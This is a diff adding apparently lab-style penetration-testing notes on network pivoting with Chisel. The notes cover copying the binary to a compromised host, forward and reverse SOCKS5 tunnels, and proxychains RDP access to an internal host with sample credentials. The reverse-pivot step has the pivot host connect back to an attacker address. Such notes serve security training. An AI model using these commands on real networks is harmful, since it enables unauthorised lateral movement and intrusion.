@@ -1,0 +1,50 @@
+# PIVOTING WITH CHISEL
+
+
+Summary: Setting Up & Using Chisel for SOCKS5 Tunneling
+1. Installing & Building Chisel
+
+Clone the Chisel repository:git clone https://github.com/jpillora/chisel.git
+
+Build the binary (requires Go installed):cd chisel && go build
+
+Note: If glibc version mismatches cause errors, use a prebuilt release from GitHub.
+
+
+
+
+2. Transferring Chisel to the Pivot Host
+
+Use SCP to copy the binary to the compromised machine (pivot host):scp chisel ubuntu@10.129.202.64:~/
+
+
+
+3. Setting Up a Chisel Server (Forward Pivot)
+
+On the pivot host (Ubuntu), start the Chisel server in SOCKS5 mode:
+./chisel server -v -p 1234 --socks5
+
+Listens on port 1234 and forwards traffic via SOCKS5.
+
+
+On the attack host, connect as a Chisel client:
+./chisel client -v 10.129.202.64:1234 socks
+
+Creates a tunnel on 127.0.0.1:1080.
+
+
+Configure proxychains to use the tunnel:
+echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
+
+Test the pivot (e.g., RDP to an internal host):
+proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+
+
+
+4. Reverse Pivot (When Inbound Connections Are Blocked)
+
+On the attack host, start a reverse Chisel server:
+sudo ./chisel server --reverse -v -p 1234 --socks5
+
+On the pivot host (Ubuntu), connect back to the attack host:
+./chisel client -v 10.10.14.17:1234 R:socks
